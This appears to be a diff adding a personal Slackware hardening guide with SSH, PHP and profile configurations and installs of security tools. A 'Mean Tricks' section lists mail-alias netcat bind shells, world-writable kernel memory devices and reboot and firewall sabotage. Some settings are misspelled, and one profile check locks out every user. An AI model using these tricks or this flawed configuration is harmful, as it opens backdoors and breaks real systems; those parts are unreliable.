+        all_url_fopen = Off
+        open_basdir = /var/www
+        disable_functions = system,exec,shell_exec,eval,include,require,include_
+once,require_once,preg_replace
+        safe_mode = On
+        safe_mode_include_dir = /usr/php/include
+        safe_mode_exec_dir = /usr/php/bin
+        safe_mode_gid = On
+        safe_mode_allowed_env_vars = PHP_
+        safe_mode_protected_env_vars = LD_LIBRARY_PATH
+
+    root@darkstar:~# touch /var/log/apache/php_errors
+    root@darkstar:~# mkdir -p /usr/php/include
+    root@darkstar:~# mkdir /usr/php/bin
+
+    man httpd
+    man php
+
+/etc/ssh/ssh_config:
+    # Host *
+    ForwardAgent no
+    ForwardX11 no
+    RhostsRSAAuthentication no
+    RSAAuthentication no
+    PasswordAuthentication yes
+    HostbasedAuthentication no
+    BatchMode no
+    CheckHostIP yes
+    AddressFamily any
+    ConnectTimeout 0
+    StrictHostKeyChecking ask
+    #   IdentityFile ~/.ssh/identity
+    IdentityFile ~/.ssh/id_rsa
+    IdentityFile ~/.ssh/id_dsa
+    Port 22
+    Protocol 2
+    #   Cipher 3des
+    # Ciphers aes256-cbc,aes256-ctr
+    EscapeChar ~
+    Compression yes
+    HashKnownHosts yes
+    EnableSSHKeysign no
+    LogLevel DEBUG
+    PubkeyAuthenticaton yes
+    ServerAliveInterval 60
+    ServerAliveCountMax 10
+    TCPKeepAlive no
+    UserKnownHostsFile ~/.ssh/known_hosts
+
+/etc/ssh/sshd_config
+    Port 22
+    Protocol 2
+    AddressFamily inet
+    ListenAddress 192.168.1.2
+
+    # HostKey for protocol version 1
+    #HostKey /etc/ssh/ssh_host_key
+    # HostKeys for protocol version 2
+    HostKey /etc/ssh/ssh_host_rsa_key
+    HostKey /etc/ssh/ssh_host_dsa_key
+
+    # Lifetime and size of ephemeral version 1 server key
+    #KeyRegenerationInterval 1h
+    #ServerKeyBits 768
+
+    # Logging
+    # obsoletes QuietMode and FascistLogging
+    SyslogFacility AUTH
+    LogLevel DEBUG
+
+    # Authentication:
+
+    LoginGraceTime 2m
+    PermitRootLogin no
+    StrictModes yes
+    MaxAuthTries 6
+
+    AllowUsers dentonj@trustedhost
+    AllowGroups wheel
+
+    RSAAuthentication no
+    PubkeyAuthentication yes
+    AuthorizedKeysFile     .ssh/authorized_keys
+
+    # For this to work you will also need host keys in /etc/ssh/ssh_known_hosts
+    RhostsRSAAuthentication no
+    # similar for protocol version 2
+    HostbasedAuthentication no
+    # Change to yes if you don't trust ~/.ssh/known_hosts for
+    # RhostsRSAAuthentication and HostbasedAuthentication
+    IgnoreUserKnownHosts no
+    # Don't read the user's ~/.rhosts and ~/.shosts files
+    IgnoreRhosts yes
+
+    # To disable tunneled clear text passwords, change to no here!
+    PasswordAuthentication no
+    PermitEmptyPasswords no
+
+    # Change to no to disable s/key passwords
+    #ChallengeResponseAuthentication yes
+
+    # Kerberos options
+    #KerberosAuthentication no
+    #KerberosOrLocalPasswd yes
+    #KerberosTicketCleanup yes
+    #KerberosGetAFSToken no
+
+    # GSSAPI options
+    #GSSAPIAuthentication no
+    #GSSAPICleanupCredentials yes
+
+    #UsePAM no
+
+    AllowTcpForwarding yes
+    GatewayPorts no
+    X11Forwarding no
+    X11DisplayOffset 10
+    X11UseLocalhost yes
+    PrintMotd yes
+    PrintLastLog yes
+    TCPKeepAlive no
+    UseLogin no
+    UsePrivilegeSeparation yes
+    PermitUserEnvironment no
+    Compression delayed
+    ClientAliveInterval 60
+    ClientAliveCountMax 10
+    UseDNS yes
+    PidFile /var/run/sshd.pid
+    #MaxStartups 10
+
+    # no default banner path
+    Banner /etc/issue.net
+
+    # override default of no subsystems
+    #Subsystem       sftp    /usr/libexec/sftp-server
+
+    # Ciphers aes256-cbc,aes256-ctr
+
+    # login.conf(5) is not used in Slackware
+    ChallengeResponseAuthentication no
+
+
+    root@darkstar:~# chmod u-s /usr/libexec/ssh-keysign
+
+    man ssh
+    man sshd
+    man ssh_config
+    man sshd_config
+
+/etc/ssh/sshrc:
+
+    TODO
+
+/usr/bin/mysql_safe:
+    TODO
+
+    root@darkstar:~# less /var/lib/mysql/darkstar.err
+
+    man mysql_fix_privilege_tables
+
+NFS:
+
+    root@darkstar:~# removepkg nfs-utils
+
+NIS:
+
+    root@darkstar:~# removepkg yptools
+
+
+----[ Security Programs/Scripts ]----
+
+GnuPG:
+    On the Slackware Source CD 3:
+
+    mount /mnt/cdrom
+    cd /mnt/cdrom/testing/packages
+    installpkg gnupg-1.4.2-i486-1.tgz
+
+libsafe:
+    On the Slackware Source CD 3:
+
+    mount /mnt/cdrom
+    cd /mnt/cdrom/extra/libsafe-2.0.16
+    installpkg libsafe-2.0.16-i386-1.tgz
+
+Snort:
+    http://www.snort.org
+
+    TODO
+
+sXid:
+    http://packages.debian.org/stable/source/sxid
+
+    root@darkstar:~# cp sxid_4.0.5.tar.gz src
+    root@darkstar:~# cd src
+    root@darkstar:~/src# gzip -cd sxid_4.0.5.tar.gz | tar xvf -
+    root@darkstar:~/src# cd sxid-4.0.5
+    root@darkstar:~/src/sxid-4.0.5# less README
+    root@darkstar:~/src/sxid-4.0.5# make install
+
+    /usr/local/etc/sxid.conf:
+        ALWAYS_NOTIFY = "yes"
+        ALWAYS_ROTATE = "yes"
+        IGNORE_DIRS = ""
+
+    /etc/cron.daily/sxid:
+        #!/bin/sh
+        /usr/local/bin/sxid
+
+    root@darkstar:~# chmod 700 /etc/cron.daily/sxid
+    root@darkstar:~# sxid
+
+chkrootkit:
+    http://www.chkrootkit.org
+
+    root@darkstar:~# cp chkrootkit_0.46a.tar.gz src/
+    root@darkstar:~# cd src
+    root@darkstar:~/src# gzip -cd chkrootkit_0.46a.tar.gz | tar xvf -
+    root@darkstar:~/src# cd chkrootkit-0.46a
+    root@darkstar:~/src/chkrootkit-0.46a# less README
+    root@darkstar:~/src/chkrootkit-0.46a# make sense
+
+    Copy the following to /usr/local/sbin:
+        check_wtmpx
+        chkdirs
+        chklastlog
+        chkproc
+        chkrootkit
+        chkutmp
+        chkwtmp
+        ifpromisc
+        strings-static
+
+    root@darkstar:~# crontab -e
+        # Chkrootkit, results are mailed to root
+        10 4 * * * ( cd /usr/local/sbin && ./chkrootkit 2>&1)
+    root@darkstar:~# killall -HUP crond
+
+aide:
+    http://sourceforge.net/project/aide
+
+    TODO
+
+lcap:
+
+    root@darkstar:~# cp lcap_0.0.6.orig.tar.gz src/
+    root@darkstar:~# cd src
+    root@darkstar:~/src# gzip -cd lcap_0.0.6.orig.tar.gz | tar xvf -
+    root@darkstar:~/src/# cd lcap-0.0.6/
+    root@darkstar:~/src/lcap-0.0.6# less README
+    root@darkstar:~/src/lcap-0.0.6# make
+    root@darkstar:~/src/lcap-0.0.6# strip lcap
+    root@darkstar:~/src/lcap-0.0.6# cp lcap /usr/local/sbin
+
+
+----[ Usibility/Reducing Security ]----
+
+
+Run X applications as root:
+    The Linux Security Cookbook contains a short script that will set DISPLAY
+    and XAUTHORITY to allow root to run X apps.  Or you can cheat by setting
+    DISPLAY and HOME to accomplish the same thing.
+
+    root@darkstar:~# xv
+    xv: Can't open display
+    root@darkstar:~# DISPLAY=:0.0
+    root@darkstar:~# xv
+    Xlib: connection to ":0.0" refused by server
+    Xlib: Invalid MIT-MAGIC-COOKIE-1 key
+    xv: Can't open display
+    root@darkstar:~# HOME=/home/dentonj
+    root@darkstar:~# xv
+
+    A better way is to use xauth and set the MIT-MAGIC-COOKIE:
+
+    root@darkstar:~# xauth -f /home/dentonj/.Xauthority extract - :0 | \
+        xauth merge -
+    root@darkstar:~# xauth list
+    darkstar/unix:0  MIT-MAGIC-COOKIE-1  abcdef0123456789abcdef0123456789
+    dentonj@darkstar:~$ xauth list
+    darkstar/unix:0  MIT-MAGIC-COOKIE-1  abcdef0123456789abcdef0123456789
+    localhost:0  MIT-MAGIC-COOKIE-1  9876543219fedcba9876543210fedcba
+
+    You still have to set DISPLAY for root.  Be aware that setting DISPLAY in a
+    shell config file (e.g. - /etc/profile) may cause problems with X
+    forwarding in ssh.
+
+    man xauth
+    man Xsecurity
+
+/usr/bin/lessopen.sh:
+    I like to dig around inside of binaries.  Uncomment the following lines:
+
+    *) FILE=`file -L "$1"` ; # Check to see if binary, if so -- view with 'strin
+gs'
+    FILE1=`echo $FILE | cut -d ' ' -f 2`
+    FILE2=`echo $FILE | cut -d ' ' -f 3`
+    if [ "$FILE1" = "Linux/i386" -o "$FILE2" = "Linux/i386" \
+         -o "$FILE1" = "ELF" -o "$FILE2" = "ELF" ]; then
+      strings "$1"
+    fi ;;
+
+Error Beep:
+  I make extensive use of tab completion in bash.  However, the error beeps
+  tend to annoy those around me.  Here are three ways to turn off the error
+  beep.
+
+  /etc/profile:
+      setterm -bfreq 0
+
+  ~/.xinitrc:
+      xset -b
+      exec /usr/X11R6/bin/startfluxbox
+
+  /etc/inputrc:
+      set bell-style none
+
+  man bash
+
+----[ Mean Tricks ]----
+
+
+/etc/aliases:
+    opensaysme:         | nc -l -p 44444 -e /bin/sh
+
+~/.forward:
+    | nc -l -p 44444 -e /bin/sh
+
+/etc/login.defs:
+    NO_PASSWORD_CONSOLE tty1,tty2,tty3,tty4,tty5,tty6
+
+/etc/rc.d/rc.6:
+    touch /etc/forcefsck
+
+/etc/hotplug/blacklist:
+    hid
+
+/etc/inittab:
+    id:6:initdefault:
+
+iptables -m random
+
+iptables -A FORWORD -s 192.168.1.1 -m random --average 90 -j DROP
+
+iptables -A INPUT -j DROP
+
+Anywhere in /etc/rc.d:
+    reboot
+
+enable -n enable
+
+chmod u+s /usr/bin/strace
+
+chmod u+s /usr/bin/gdb
+
+chmod 666 /dev/mem
+
+chmod 666 /dev/kmem
+
+chmod 666 /dev/port
+
+ifconfig eth0 mtu 68
+
+touch ./-r
+
+
+----[ Useful Commands ]----
+
+
+ldd /usr/bin/lppasswd
+/lib/ld-linux.so.2 --list /usr/bin/lppasswd
+
+strings /usr/bin/lppasswd
+
+List some of the popular REM commands used.
+
+man -k cron
+
+grep crond /var/log/packages/*
+
+cd /bin && for i in `ls | grep -v "@$"`; do
+  file $i | grep "not stripped"
+  done
+
+for i in /bin /sbin /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin \
+/usr/X11R6/bin; do echo $i; cd $i && for j in `ls | grep "@$"`; do file $j \
+| grep "not stripped"; done; done
+
+which kill
+type -a kill
+
+stat /bin/login
+touch example
+stat example
+touch -r /bin/login example
+stat example
+
+strace -p 19148 -f -e trace=network,read,write -o ssh_trace.out -e write=4 \
+    -e read=6  # Where 19148 is the PID of sshd
+
+ifconfig eth0 hw ether 00:00:DE:AD:BE:EF
+ifconfig eth0 0.0.0.0 up -arp
+
+ln -s /usr/bin/write /bin/write
+kibitz dentonj
+
+
+----[ /etc/profile ]----
+
+
+# If the following variables are not set, exit with an error message
+: ${USER:?Who are you?}
+: ${LOGNAME:?Who are you?}
+: ${HOME:?The homeless need help}
+
+# If a user doesn't have a home directory listed in /etc/passwd,
+# login is nice enough to set "/" as $HOME
+if [ ${HOME} = "/" ]; then
+  logout
+fi
+
+# Kick and lockout users that are UID 0 but are not root
+if [ `id -u` = "0" -a `echo $USER` != "root" ]; then
+
+  # Lock the user out
+  passwd -l $USER
+
+  # Save some info
+  date >> /root/SHIT
+  netstat -peanut >> /root/SHIT
+  ps auxww >> /root/SHIT
+  w >> /root/SHIT
+
+  w | mail -s "$USER has gained ROOT access on $HOSTNAME" dentonj@gmail.com
+
+  # Let EVERYONE know
+
+  wall << EOF
+
+****************************************************************
+
+          $USER has gained ROOT access on $HOSTNAME!!!
+
+****************************************************************
+
+EOF
+
+  for i in `ls /dev/pts/`; do
+    echo -e "\n$USER has gained ROOT access on $HOSTNAME!!\n" >> /dev/pts/$i
+  done
+
+  # Log it
+  logger -is -f /var/log/messages "$USER has gained ROOT access!!"
+
+  # Let the luzer know
+  echo -e "\a\n\n You are _NOT_ root!!\n\n\a"
+
+  # For the really paranoid (run before killing the user's processes)
+  ifconfig eth0 down
+
+  # Kill the user and their processes
+  skill -9 -u $USER
+
+  # This should be redundant
+  logout
+  exit
+fi
+
+export LESSOPEN="|/usr/bin/lessopen.sh %s"
+
+# Set a default shell prompt:
+#PS1='`hostname`:`pwd`#'
+#if [ "$SHELL" = "/bin/pdksh" ]; then
+#  PS1='! $ '
+#elif [ "$SHELL" = "/bin/ksh" ]; then
+#  PS1='! ${PWD/#$HOME/~}$ '
+#elif [ "$SHELL" = "/bin/zsh" ]; then
+#  PS1='%n@%m:%~%# '
+#elif [ "$SHELL" = "/bin/ash" ]; then
+#  PS1='$ '
+#else
+#  PS1=/\u@\h:\w\$ '
+#fi
+if [ `id -u` = 0 ]; then
+  # A red shell prompt for root
+  PS1="\[\033[1;31m\][\j][\u@\h:\w]#\[\033[0m\] "
+else
+  # A green shell prompt for everyone else
+  PS1="\[\033[1;32m\][\j][\u@\h:\w]$\[\033[0m\] "
+fi
+PS2='>'
+export PATH LESS TERM PS1 PS2
+
+# For non-root users, add the current directory to the search path:
+#if [ ! "`id -u`" = "0" ]; then
+#  PATH="$PATH:."
+#fi
+
+#
+# Stuff I've added
+#
+
+# Add $HOME/bin to the search path
+PATH=$PATH:$HOME/bin
+export PATH
+
+export FIGNORE=".o"
+
+# Set EDITOR for less
+export EDITOR=vim
+
+# History
+# I use to set these to paranoid settings, such as 100 or 10.
+export HISTSIZE=10000
+export HISTFILESIZE=10000
+
+# Display timestamp information with each history entry
+export HISTTIMEFORMAT="%F %T "
+
+# Logout if a root terminal is not being used
+if [ `id -u` = "0" ]; then
+    export TMOUT=1200
+fi
+
+# Aliases
+alias matrix="cmatrix -bass"
+alias m="cmatrix -bass"
+alias su="su -"
+alias td="tcpdump -nvvSi eth0 | grcat conf.tcpdump"
+
+# shred doesn't delete recursively
+# use "/bin/rf -rf ..." for directories
+alias rm="shred -uz"
+
+# Disable the bash builtin command kill, forces the use
+# of /bin/kill.
+# This was a cute idea, but it prevents jobs from being killed
+#enable -n kill
+
+# Misc shell settings
+shopt -s cdspell
+shopt -s cmdhist
+shopt -s dotglob
+shopt -s extglob
+setterm -bfreq 0
+
+# grep options
+export GREP_OPTIONS="-n --color"
+export GREP_COLOR="1;33"
+
+# Secure less
+export LESSSECURE=1
+
+# This works for single user systems if the luzer who breaks into your
+# system uses an interactive shell
+if [ `id -u` != "0" -o `id -u` != "1000" ]; then
+    passwd -l $USER
+    logout
+fi
+
+# Set these and make them read only to keep users from setting them
+export HISTCONTROL=""
+export HISTIGNORE=""
+
+# Disable builtin shell commands
+# TODO
+
+# Set shell variables as read only, this should be last:
+typeset -r HISTCONTROL
+typeset -r HISTFILE
+typeset -r HISTFILESIZE
+typeset -r HISTIGNORE
+typeset -r HISTNAME
+typeset -r HISTSIZE
+typeset -r LESSSECURE
+typeset -r LOGNAME
+typeset -r USER
+
+
+-- When You Are Done --
+
+Join the irc channel #slackware on irc.oftc.net and talk about everything
+but Slackware.
+
+
+-- Todo --
+
+KDE:
+    Look into it
+
+/etc/shells:
+    Lock down the other shells.
+
+/bin/login:
+    Modify so a different encryption hashing algorithms is used.
+
+Securing filesystems other than ext2 and ext3
+
+Log checking utility
+
+
+--  Resources --
+
+
+
+
